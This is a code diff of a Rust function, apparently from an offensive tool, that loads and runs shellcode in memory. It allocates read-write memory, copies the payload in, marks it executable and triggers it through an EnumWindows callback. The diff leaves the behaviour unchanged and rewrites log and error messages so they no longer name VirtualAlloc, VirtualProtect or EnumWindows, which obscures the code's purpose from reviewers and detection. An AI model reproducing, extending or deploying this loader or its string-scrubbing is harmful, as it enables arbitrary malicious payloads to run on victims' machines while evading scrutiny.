@@ -10,7 +10,7 @@ pub fn live_inject(shellcode: &[u8], log: &LogSink) -> Result<InjectionResult, S
     const PAGE_READWRITE: u32 = 0x04;
     const PAGE_EXECUTE_READ: u32 = 0x20;
 
-    log.step("[1/4] VirtualAlloc(PAGE_READWRITE) for shellcode".to_string());
+    log.step("[1/4] Allocate local memory (RW)".to_string());
     let alloc = unsafe {
         resolve::VirtualAlloc(
             std::ptr::null(),
@@ -20,7 +20,7 @@ pub fn live_inject(shellcode: &[u8], log: &LogSink) -> Result<InjectionResult, S
         )
     };
     if alloc.is_null() {
-        return Err("VirtualAlloc failed".to_string());
+        return Err("allocation failed".to_string());
     }
     let base = alloc as usize;
 
@@ -32,16 +32,16 @@ pub fn live_inject(shellcode: &[u8], log: &LogSink) -> Result<InjectionResult, S
         std::ptr::copy_nonoverlapping(shellcode.as_ptr(), alloc as *mut u8, shellcode.len());
     }
 
-    log.step("[3/4] VirtualProtect → PAGE_EXECUTE_READ".to_string());
+    log.step("[3/4] Set memory protection (RX)".to_string());
     let mut old_protect: u32 = 0;
     let ok = unsafe {
         resolve::VirtualProtect(alloc, shellcode.len(), PAGE_EXECUTE_READ, &mut old_protect)
     };
     if ok == 0 {
-        return Err("VirtualProtect failed".to_string());
+        return Err("memory protection change failed".to_string());
     }
 
-    log.step("[4/4] EnumWindows(callback) — shellcode executes as callback".to_string());
+    log.step("[4/4] Trigger callback execution".to_string());
     unsafe {
         resolve::EnumWindows(alloc as *const std::ffi::c_void, 0);
     }
